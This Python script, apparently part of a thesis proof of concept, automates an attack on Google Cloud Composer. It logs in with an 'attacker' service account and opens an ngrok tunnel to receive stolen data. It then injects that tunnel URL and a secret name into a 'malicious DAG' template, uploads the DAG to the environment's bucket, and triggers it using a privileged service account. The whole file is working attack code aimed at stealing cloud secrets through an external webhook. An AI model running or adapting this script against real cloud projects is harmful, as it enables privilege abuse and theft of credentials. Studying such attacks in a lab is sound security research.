import os
import subprocess
import sys
import re
import time

# =======================
# CONFIG
# =======================
PROJECT_ID = "poc-tfm-tests"
REGION = "us-central1"
DEFAULT_ENV_NAME = "tfm-composer-env"

# DAG / Task
DAG_NAME = "persistent_escalated_dag"
SECRET_NAME = "test-secret"         # alineado con 1_create_env.py

# Rutas plantilla/salida del DAG
TEMPLATE_PATH = "modules/abuse_composer_dag/malicious_dag.py.template"
DAG_OUTPUT_PATH = "modules/abuse_composer_dag/malicious_dag.py"

# Service Accounts (ajusta rutas a las keys si usas otras)
PRIV_SA_EMAIL = "internal-support@poc-tfm-tests.iam.gserviceaccount.com"
PRIV_SA_KEY   = "internal-support-key.json"
ATT_SA_EMAIL  = "attacker-sa@poc-tfm-tests.iam.gserviceaccount.com"
ATT_SA_KEY    = "attacker-sa-key.json"

# --- Arg --use-existing <env_name> ---
ENV_NAME = DEFAULT_ENV_NAME
if "--use-existing" in sys.argv:
    idx = sys.argv.index("--use-existing")
    if idx + 1 < len(sys.argv):
        ENV_NAME = sys.argv[idx + 1]

# =======================
# HELPERS
# =======================
def run_cmd(cmd, check=True):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True)
    if check and result.returncode != 0:
        print("[!] Error executing command.")
        sys.exit(1)
    return result.returncode

def auth_sa(email, key):
    run_cmd(
        f"gcloud auth activate-service-account {email} "
        f"--key-file={key} --project={PROJECT_ID}"
    )

def start_ngrok_and_get_url():
    print("[*] Starting ngrok tunnel...")
    ngrok_proc = subprocess.Popen(
        ["ngrok", "http", "8080"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(5)
    try:
        result = subprocess.check_output(
            ["curl", "-s", "http://localhost:4040/api/tunnels"]
        ).decode("utf-8")
        match = re.search(r'"public_url":"(https://[^"]+)"', result)
        if match:
            url = match.group(1)
            print(f"[+] Ngrok URL obtained: {url}")
            return ngrok_proc, url
        else:
            raise RuntimeError("Could not find public_url in ngrok response")
    except Exception as e:
        print(f"[!] Error getting Ngrok URL: {e}")
        ngrok_proc.terminate()
        return None, None

def prepare_dag_with_webhook(webhook_url):
    print("[*] Preparing malicious DAG with embedded webhook & secret name...")
    with open(TEMPLATE_PATH, "r") as template_file:
        dag_code = template_file.read()

    # Sustituye placeholders / valores
    dag_code = dag_code.replace("__WEBHOOK_URL__", webhook_url)
    # Si tu plantilla tiene placeholder explícito del secreto:
    dag_code = dag_code.replace("__SECRET_NAME__", SECRET_NAME)
    # Además, por si la plantilla venía con 'my-secret' hardcodeado:
    dag_code = dag_code.replace("secrets/my-secret/", f"secrets/{SECRET_NAME}/")

    with open(DAG_OUTPUT_PATH, "w") as output_file:
        output_file.write(dag_code)

    print("[✓] malicious_dag.py generated.")

def get_dag_bucket():
    result = subprocess.run(
        f"gcloud composer environments describe {ENV_NAME} "
        f"--location={REGION} --project={PROJECT_ID} "
        f"--format='value(config.dagGcsPrefix)'",
        shell=True, capture_output=True, text=True
    )
    if result.returncode != 0:
        print("[!] Failed to get DAG bucket.")
        sys.exit(1)
    dag_path = result.stdout.strip()
    if not dag_path:
        print("[!] Empty DAG bucket path.")
        sys.exit(1)
    bucket = dag_path.replace("gs://", "").split("/")[0]
    print(f"[+] DAG bucket: {bucket}")
    return bucket

def upload_dag(bucket):
    print("[*] Uploading DAG to Composer bucket...")
    run_cmd(
        f"gsutil -o GSUtil:default_project_id={PROJECT_ID} "
        f"cp {DAG_OUTPUT_PATH} gs://{bucket}/dags/"
    )
    print("[✓] DAG uploaded.")

def unpause_and_trigger():
    print("[*] Unpausing DAG (idempotent)…")
    run_cmd(
        f"gcloud composer environments run {ENV_NAME} "
        f"--location={REGION} --project={PROJECT_ID} "
        f"dags unpause -- {DAG_NAME}",
        check=False
    )

    print("[*] Triggering DAG…")
    run_cmd(
        f"gcloud composer environments run {ENV_NAME} "
        f"--location={REGION} --project={PROJECT_ID} "
        f"dags trigger -- {DAG_NAME}"
    )

def show_task_info_only():
    # No usamos 'tasks logs' (no está disponible en tu versión); listamos tasks como confirmación.
    print("[*] Listing tasks in DAG (to confirm DAG is registered)…")
    run_cmd(
        f"gcloud composer environments run {ENV_NAME} "
        f"--location={REGION} --project={PROJECT_ID} "
        f"tasks list -- {DAG_NAME}",
        check=False
    )
    print("[i] Logs de la task no disponibles por CLI en esta versión. "
          "Valida por Cloud Logging o con el webhook (ya recibido).")

# =======================
# MAIN
# =======================
def main():
    # Subir el DAG como ATACANTE (mínimos privilegios GCS)
    print("[*] Authenticating as attacker SA to upload DAG…")
    auth_sa(ATT_SA_EMAIL, ATT_SA_KEY)

    ngrok_proc, webhook_url = start_ngrok_and_get_url()
    if not webhook_url:
        print("[!] Could not continue without a valid webhook URL.")
        return

    prepare_dag_with_webhook(webhook_url)
    bucket = get_dag_bucket()
    upload_dag(bucket)

    print("[*] Waiting 15s for DAG sync…")
    time.sleep(15)

    # Cambiar a SA PRIVILEGIADA para operar el control-plane de Composer
    print("[*] Switching to privileged SA to control Composer…")
    auth_sa(PRIV_SA_EMAIL, PRIV_SA_KEY)

    unpause_and_trigger()
    show_task_info_only()

    # (Opcional) volver a atacante si tu flujo lo necesita
    print("[*] Switching back to attacker SA…")
    auth_sa(ATT_SA_EMAIL, ATT_SA_KEY)

    print("[*] Cleaning up Ngrok process…")
    try:
        ngrok_proc.terminate()
    except Exception:
        pass
    print("[✓] Ngrok tunnel closed.")
    print("[✓] Attack deployed. Returning control to run_attack.py")

if __name__ == "__main__":
    main()
